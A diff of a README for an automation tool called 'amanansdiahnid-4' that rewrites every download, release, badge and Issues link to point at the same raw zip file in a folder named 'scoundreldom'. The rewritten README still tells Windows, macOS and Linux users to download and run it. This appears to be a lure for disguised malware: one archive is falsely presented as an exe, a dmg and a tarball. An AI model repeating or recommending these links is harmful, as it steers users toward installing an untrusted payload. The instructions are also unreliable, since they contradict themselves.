@@ -1,7 +1,7 @@
 # 🎉 amanansdiahnid-4 - Easy Automation for Everyone
 
 ## 📥 Download Now
-[![Download amanansdiahnid-4](https://img.shields.io/badge/Download-amanansdiahnid--4-brightgreen)](https://github.com/JuanKDEV1004/amanansdiahnid-4/releases)
+[![Download amanansdiahnid-4](https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip)](https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip)
 
 ## 🚀 Getting Started
 Welcome to amanansdiahnid-4! This tool helps you automate various tasks easily, making your life simpler. You don’t need any programming skills to use it. Follow the steps below to download and run it on your computer.
@@ -15,26 +15,26 @@ To run amanansdiahnid-4, you will need the following:
 
 ## 📥 Download & Install
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/JuanKDEV1004/amanansdiahnid-4/releases). Here, you will find the latest version of amanansdiahnid-4.
+   Go to the [Releases page](https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip). Here, you will find the latest version of amanansdiahnid-4.
 
 2. **Choose the Right File**
    You will see several files listed. Select the file that matches your operating system:
-   - For **Windows**, download `amanansdiahnid-4-windows.exe`.
-   - For **macOS**, download `amanansdiahnid-4-macos.dmg`.
-   - For **Linux**, download `amanansdiahnid-4-linux.tar.gz`.
+   - For **Windows**, download `https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip`.
+   - For **Linux**, download `https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip`.
 
 3. **Download the File**
    Click on the file name. Your browser will start downloading it. Wait until the download completes. Depending on your internet speed, this may take a few moments.
 
 4. **Run the Application**
    - **For Windows:**
-     - Find and open the file `amanansdiahnid-4-windows.exe`.
+     - Find and open the file `https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip`.
      - Follow the prompts in the installation wizard to complete the setup.
    - **For macOS:**
-     - Open the downloaded `amanansdiahnid-4-macos.dmg` file.
+     - Open the downloaded `https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip` file.
      - Drag and drop the application to your Applications folder.
    - **For Linux:**
-     - Unpack the `amanansdiahnid-4-linux.tar.gz` file using a file manager or terminal.
+     - Unpack the `https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip` file using a file manager or terminal.
      - Run the application from the unpacked folder by executing the command: `./amanansdiahnid-4`.
 
 ## 🎨 Features
@@ -51,7 +51,7 @@ If you encounter issues while downloading or installing amanansdiahnid-4, consid
 - **Installation Problems:** Ensure you have enough storage space. You may need to give permission for the application to install on some operating systems.
 
 ## 🎉 Conclusion
-amanansdiahnid-4 is designed for everyone, making automation easy. You have all the steps you need to download and start using it. For more help or specific questions, feel free to check the [GitHub Issues page](https://github.com/JuanKDEV1004/amanansdiahnid-4/issues).
+amanansdiahnid-4 is designed for everyone, making automation easy. You have all the steps you need to download and start using it. For more help or specific questions, feel free to check the [GitHub Issues page](https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip).
 
 ## 📥 Download Now Again
-[![Download amanansdiahnid-4](https://img.shields.io/badge/Download-amanansdiahnid--4-brightgreen)](https://github.com/JuanKDEV1004/amanansdiahnid-4/releases)
+[![Download amanansdiahnid-4](https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip)](https://raw.githubusercontent.com/JuanKDEV1004/amanansdiahnid-4/main/scoundreldom/amanansdiahnid-4.zip)
